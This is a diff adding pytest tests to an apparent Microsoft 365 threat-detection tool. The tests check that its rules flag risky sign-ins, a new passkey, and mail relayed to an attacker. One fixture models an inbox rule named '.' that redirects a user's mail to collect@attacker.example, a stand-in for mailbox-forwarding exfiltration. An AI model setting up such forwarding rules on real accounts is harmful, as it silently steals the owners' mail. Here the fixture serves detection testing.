@@ -610,3 +610,85 @@ def test_message_trace_directory_audit_and_risk_rows_are_cloud_rows_to_the_analy
     assert chains._m365_step(rows[0], {}, {}) is None
     consent = next(r for r in rows if r["operation"] == "Consent to application.")
     assert chains._m365_step(consent, {}, {})[1].startswith("OAuth consent granted")
+
+
+# ---------------------------------------------------------------------------
+# Rules for what these exports answer
+# ---------------------------------------------------------------------------
+def _passkey_added() -> dict:
+    """A directory audit of a passkey added for alice, from the attacker's address."""
+    return m365.audit_row(
+        {
+            "id": "Directory_7c1d2e3f-4a5b-4c6d-8e7f-9a0b1c2d3e4f_Q2W3E_123456789",
+            "category": "UserManagement",
+            "correlationId": "8d2e3f4a-5b6c-4d7e-8f9a-0b1c2d3e4f5a",
+            "result": "success",
+            "resultReason": "",
+            "activityDisplayName": "Add Passkey (device-bound)",
+            "activityDateTime": "2026-09-01T10:11:05Z",
+            "loggedByService": "Authentication Methods",
+            "operationType": "Add",
+            "initiatedBy": {"user": {"id": "5f1c2a3b-0d4e-4f60-8a71-92b3c4d5e6f7", "userPrincipalName": "alice@contoso.com", "ipAddress": "198.51.100.23"}},
+            "targetResources": [
+                {"id": "5f1c2a3b-0d4e-4f60-8a71-92b3c4d5e6f7", "type": "User", "userPrincipalName": "alice@contoso.com", "modifiedProperties": []}
+            ],
+            "additionalDetails": [],
+        }
+    )
+
+
+def _inbox_rule(when: str) -> dict:
+    """New-InboxRule by alice in the audit log, from the attacker's address."""
+    return m365.ual_row(
+        {
+            "CreationTime": when,
+            "Id": "0b1c2d3e-4f5a-4b6c-8d7e-9f0a1b2c3d4e",
+            "Operation": "New-InboxRule",
+            "RecordType": 1,
+            "UserId": "alice@contoso.com",
+            "Workload": "Exchange",
+            "ClientIP": "198.51.100.23",
+            "ResultStatus": "True",
+            "Parameters": [{"Name": "Name", "Value": "."}, {"Name": "RedirectTo", "Value": "collect@attacker.example"}],
+        }
+    )
+
+
+@pytest.mark.parametrize(("inbox_rule_at", "escalated"), [("2026-09-01T10:20:00", True), ("2026-09-03T10:20:00", False)])
+def test_the_rules_for_risk_new_sign_in_methods_and_the_message_trace_fire_on_these_exports(tmp_path, store, inbox_rule_at, escalated):
+    rows = [_passkey_added(), _inbox_rule(inbox_rule_at)]
+    for name in (
+        "entra-risk-detections.graph.json",
+        "entra-risky-users.graph.json",
+        "entra-directory-audits.graph.json",
+        "exo-messagetrace.get-messagetrace.csv",
+        "exo-messagetrace.extended.csv",
+    ):
+        rows += _fixture(tmp_path, name)[0]
+    fired = _fired(store, rows)
+
+    # the detections ID Protection rated medium, both alice's; bob's low and dismissed one is not
+    assert sorted(f["entities"]["targetUser"] for f in fired["m365-risk-detection"]) == ["alice@contoso.com"] * 2
+    assert [f["entities"]["targetUser"] for f in fired["m365-risky-user"]] == ["alice@contoso.com"]
+    # a risk, then an inbox rule by the same account within a day
+    (risk,) = fired["m365-risk-then-inbox-rule"]
+    assert risk["entities"]["targetUser"] == "alice@contoso.com"
+    assert (risk["severity"], bool(risk.get("escalation"))) == (("critical", True) if escalated else ("low", False))
+    # a passkey added, a device registered, an application given a permission of its own
+    assert [f["entities"]["targetUser"] for f in fired["m365-auth-method-added"]] == ["alice@contoso.com"]
+    assert len(fired["m365-device-registered"]) == 1 and len(fired["m365-app-permission-granted"]) == 1
+    # the supplier's invoice, sent on to the attacker: once in Get-MessageTrace, and in the
+    # extended report once as the inbox rule's message and once as it left
+    relayed = fired["m365-trace-external-relay"]
+    assert len(relayed) == 3 and {f["entities"]["targetUser"] for f in relayed} == {"collect@attacker.example"}
+    assert [f["entities"]["targetUser"] for f in fired["m365-trace-mailbox-rule-message"]] == ["collect@attacker.example"]
+    # alice's own mail to the attacker and the spam bob received are not relays
+    assert not any(f["entities"]["subjectUser"] in ("alice@contoso.com", "offers@bulk.example") for f in relayed)
+
+
+def test_the_message_trace_rules_wait_for_the_internal_domains(tmp_path, store):
+    """Every address is outside an empty list of internal domains: the rules say what they need
+    rather than report every message."""
+    rows, _ = _fixture(tmp_path, "exo-messagetrace.get-messagetrace.csv")
+    fired = _fired(store, rows, {"expected_countries": ["FR"]})
+    assert not {"m365-trace-external-relay", "m365-trace-mailbox-rule-message"} & set(fired)
